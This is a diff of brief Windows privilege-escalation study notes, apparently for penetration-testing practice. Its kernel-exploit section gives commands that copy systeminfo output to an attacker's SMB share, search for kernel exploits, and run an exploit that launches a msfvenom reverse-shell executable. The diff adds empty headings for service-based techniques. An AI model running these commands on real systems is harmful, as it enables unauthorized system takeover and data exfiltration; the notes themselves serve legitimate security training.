@@ -1,8 +1,29 @@
-Kernel Exploit:
+-------------------- Kernel Exploit --------------------
 
 systeminfo > \\ip\sharename\systeminfo.txt                                                               ---> to send it to kali in smb share
 
 python widowsexploitsuggester.py systeminfo.txt -i 'Elevationof Privilege' --exploits-only | more        ---> search for kernel exploit using windows exploit suggester
 
 .\kernelexploit.exe C:\PrivEsc\reverse.exe                                                               ---> run exploit which reverse created using msfveom
+
+
+-------------------- Service Exploits --------------------
+
+
+1---- Insecure Service Permissions ----
+
+
+2---- Unquoted Service Path ----
+
+
+3---- Weak Registry Permissions ----
+
+
+4---- Insecure Service Executables ----
+
+
+5---- DLL Hijacking ----
+
+
+
 
